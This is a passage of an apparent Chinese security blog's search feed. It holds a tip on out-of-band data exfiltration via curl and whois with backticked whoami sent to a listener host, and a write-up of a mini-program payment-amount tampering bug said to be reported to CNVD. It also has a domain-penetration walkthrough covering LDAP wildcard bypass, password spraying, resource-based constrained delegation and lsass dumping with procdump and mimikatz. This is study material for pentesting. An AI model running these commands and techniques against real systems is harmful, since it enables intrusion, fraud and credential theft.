src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-23.png" class="" title="2024-02-03_09-23.png"><h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><p>命令示例：curl <a href="http://192.168.43.190:8000/%60whoami%60">http://192.168.43.190:8000/`whoami`</a></p><img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-31.png" class="" title="2024-02-03_09-31.png"><h3 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h3><p>命令示例：whois -h 192.168.233.128 -p 8888 <code>whoami</code><br>vps上nc开启监听，获取到命令执行结果</p><img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-29.png" class="" title="2024-02-03_09-29.png">]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>技巧总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次小程序“零元购”漏洞挖掘</title>
    <link href="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    <url>/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>一次简单的微信小程序漏洞挖掘。在选中商品进行支付的时候，会get一个请求，这个请求主题部分进行了url编码，当我们解码之后就可以看到商品的id号，支付金额等信息，并且没有做安全校验，只需要修改成我们想要修改的金额，直接发送数据包，就可以支付，从而达到“零元购”的危害，考虑到漏洞还没修复，所以做了厚码保护处理</p><p>声明：本文所涉及到的漏洞均已提交CNVD，切勿做违法测试!</p><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>首先进行环境准备，考虑到微信不能直接走系统代理，为了方便抓数据包，做了三层代理：proxypin + burpsuite + 手机网络设置<br>打开小程序抓包，选中一个商品</p><img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/3f49779d8e794ca3bbaae4f98242580.jpg" class="" title="3f49779d8e794ca3bbaae4f98242580.jpg"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>当我们支付的时候，会GET一个&#x2F;<em><strong>&#x2F;</strong></em>&#x2F;pay.php一个请求，里面是url编码，当我们解码就可以看到我们的支付金额的位置，只需要修改成我们想要的金额，接着发包就会弹出一个二维码，支付就好了</p><img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/90bbb441dffa24cdc3fdd8981288bb0.jpg" class="" title="90bbb441dffa24cdc3fdd8981288bb0.jpg"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/46a15724cb0af21361d0a008431e310.jpg" class="" title="46a15724cb0af21361d0a008431e310.jpg"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/4edbac588f3d7c06e65bc87fe186be3.jpg" class="" title="4edbac588f3d7c06e65bc87fe186be3.jpg"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/4af9118c44e585f7e6a01f785c78895.jpg" class="" title="4af9118c44e585f7e6a01f785c78895.jpg"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/6de7f1a907df9acaddc4ab2c5cc21a5.jpg" class="" title="6de7f1a907df9acaddc4ab2c5cc21a5.jpg"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>仅作为漏洞挖掘测试，漏洞验证后第一时间选择了退款，遵守网络安全法律</p><img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/b5330591e5a598557846d46a138f870.jpg" class="" title="b5330591e5a598557846d46a138f870.jpg"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/1913f76c114876f130db9cbd2cda8c0.jpg" class="" title="1913f76c114876f130db9cbd2cda8c0.jpg"><h2 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h2><p>从代码层面进行安全检测，存储用户密码的地方进行严格的过滤，再一个就是敏感的信息在传输过程，以及显示到网站里的时候都要进行加密，MD5加密，数据SSL加密传输，重要的数据尽可能的使用POST的提交方式进行，用户密码要使用加强的加密方式MD5+base64特殊编码的方式进行加密，对于网站的一些报错页面也要禁止掉回显</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>挖洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ldap配合基于资源的约束委派</title>
    <link href="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/"/>
    <url>/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/</url>
    
    <content type="html"><![CDATA[<h2 id="ldap信息获取"><a href="#ldap信息获取" class="headerlink" title="ldap信息获取"></a>ldap信息获取</h2><p>首先我们通过扫描，对整个内网环境进行初步的估量，可以知道的是177这台机器开放了web端，其他机器均是一些常规端口，域控机器为10机器，还是个WinServer2012，爆红的这几个永恒之蓝先放一边，虽然不知道是否能成功利用，不过抱有一丝希望来当作我们的底牌做最后的通杀</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_09-28.png" class="" title="2024-02-01_09-28.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>打开177机器的web端口，可以看到是一个员工查询系统，根据输入的提示，初步判断是用的域环境验证方式，常见的有Ldap 与 Kerberos</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_09-26.png" class="" title="2024-02-01_09-26.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>目录扫描发现了一些敏感目录：phpinfo,readme里面泄漏了部分密码</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_09-40.png" class="" title="2024-02-01_09-40.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_09-42.png" class="" title="2024-02-01_09-42.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_16-04.png" class="" title="2024-02-01_16-04.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>通过phpinfo可以判断使用了ldap方式进行对用户的验证。既然是ldap,我们可以进行filter+对应的ldap语法进行fuzz,其中我们通过*匹配所有，成功进入到了后台，获取了大量信息，其中包括成员组账户，有了账户和泄漏的密码，我们就可以进行PTH</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_09-39.png" class="" title="2024-02-01_09-39.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>通过对密码和账户的喷洒，发现了部分可以登陆ldap的凭证</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_10-15.png" class="" title="2024-02-01_10-15.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_10-16.png" class="" title="2024-02-01_10-16.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>考虑到在一些域内有些机器可能被设置了防火墙，从而无法被扫描到。当我们获得凭证了，为了获取更为详细的域内机器，可以对域控 dns 服务器中的 DNS 信息进行查询，从而获取到一些被防火墙忽略的机器</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_10-22.png" class="" title="2024-02-01_10-22.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_10-26.png" class="" title="2024-02-01_10-26.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>可以发现域中还存在 10.0.0.12 这台机器没有被扫描到，还是一台win10</p><h2 id="ldap信息导出与分析"><a href="#ldap信息导出与分析" class="headerlink" title="ldap信息导出与分析"></a>ldap信息导出与分析</h2><p>使用Adfind工具从域外进行 ldap 信息的获取并导出<br>Adfind.exe * -h 10.0.0.10 -u <user> -up <password> &gt; info.txt<br>分析的话重点关注以下属性：<br>whenCreated(创建时间)<br>memberOf(所属组)<br>userAccountControl(权限)<br>lastLogon(上次登录时间)<br>pwdLastSet(上次密码修改时间)<br>lastLogonTimestamp(上次登录时间)<br>通过这些可以确定账户的权限，账户当前的状态，在对机器的 ldap 信息进行查看时发现，这里机器中存在 mS-DS-CreatorSID 这个属性，如果存在这个属性的话，表示这台机器是由某个域用户加入机器的，该域用户对该机器具有 msDS-AllowedToActOnBehalfOfOtherIdentity 权限，所以如果控制了这个账户那么就等于拿下了对应的机器，继续收集ldap信息，并定位该账户，为下一步约束委派做准备</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_10-45.png" class="" title="2024-02-01_10-45.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><h2 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a>基于资源的约束委派</h2><p>首先利用刚才定位到的域账户建立一个机器账户，之后使用该机器账户去向该机器进行委派，然后通过 rbcd 将 win8 机器与新创建的账户建立委派，因为相比较于非约束委派，约束委派是正向委派，需要主动建立，这个时候test_computer598映入我们眼帘</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_11-31.png" class="" title="2024-02-01_11-31.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>建立委派之后将test_computer598账户的票据进行导出，这里有一点要注意，因为需要与域控进行交互，所以需要与域控的时间同步，我们可以通过ntpdate将域控时间和本机时间直接同步,最后导出完毕之后直接export导入到我们的本机</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_03-44.png" class="" title="2024-02-01_03-44.png"><h2 id="dumphash"><a href="#dumphash" class="headerlink" title="dumphash"></a>dumphash</h2><p>导入完票据之后，我们可以利用smbclient来上传猕猴桃或者 procdump 工具来获取用户 hash</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_03-51.png" class="" title="2024-02-01_03-51.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>这里如果出现无法连接445的错误，是因为目前机器是在域外，没有域控的路由表，可以手动修改 hosts 文件，做一个域名解析<br>刚才我们将票据export导入到了我们的本机，所以可以直接利用smbexec获取一个目标机器的临时shell，通过执行命令使 procdump 获取 dmp 文件</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_03-56.png" class="" title="2024-02-01_03-56.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><p>再导出到本机，本地利用猕猴桃解析 lsass.dmp 文件，得到所有hash，从而拿下域管账户</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_04-06.png" class="" title="2024-02-01_04-06.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/d4667b73316a139c13fce6de17fba66.png" class="" title="d4667b73316a139c13fce6de17fba66.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/dc6fbe7bbc96b59a197c2413c217fa6.png" class="" title="dc6fbe7bbc96b59a197c2413c217fa6.png">]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>域渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初见</title>
    <link href="/2024/01/29/%E5%88%9D%E8%A7%81/"/>
    <url>/2024/01/29/%E5%88%9D%E8%A7%81/</url>
    
    <content type="html"><![CDATA[<p>人生若只如初见<br>欢迎大家来到我的博客空间，在一切开始前，共同欣赏一下美景吧</p><img src="/2024/01/29/%E5%88%9D%E8%A7%81/test.png" class="" title="mount">]]></content>
    
    
    <categories>
      
      <category>Welcome</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hello</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
